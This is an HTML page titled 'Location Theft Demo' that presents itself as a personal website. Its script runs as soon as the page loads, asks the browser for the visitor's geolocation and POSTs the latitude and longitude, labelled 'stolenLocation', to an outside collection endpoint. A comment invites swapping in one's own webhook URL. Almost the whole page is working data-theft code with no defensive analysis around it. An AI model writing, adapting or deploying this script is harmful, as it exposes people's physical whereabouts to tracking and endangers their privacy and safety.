<!DOCTYPE html>
<html lang="en">
<head>

    <title>Location Theft Demo</title>
</head>
<body>
    <h1>Welcome to My Website!</h1>
    <p>We are capturing your location and sending it elsewhere.</p>

    <script>
        // Function to get user location and send it to the attacker
        function stealLocation() {
            if ("geolocation" in navigator) {
                // Ask the user for their location
                navigator.geolocation.getCurrentPosition(function(position) {
                    // Extract latitude and longitude
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;

                    // Log location for testing
                    console.log("Captured Location:", latitude, longitude);

                    // Send location to an attacker-controlled server (Webhook.site in this case)
                    fetch('	https://none2323.free.beeceptor.com', {  // Replace with your Webhook URL
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            stolenLocation: {
                                latitude: latitude,
                                longitude: longitude
                            }
                        })
                    });
                }, function(error) {
                    console.error("Error getting location: " + error.message);
                });
            } else {
                console.log("Geolocation not supported by this browser.");
            }
        }

        // Call the function to steal the location
        stealLocation();
    </script>
</body>
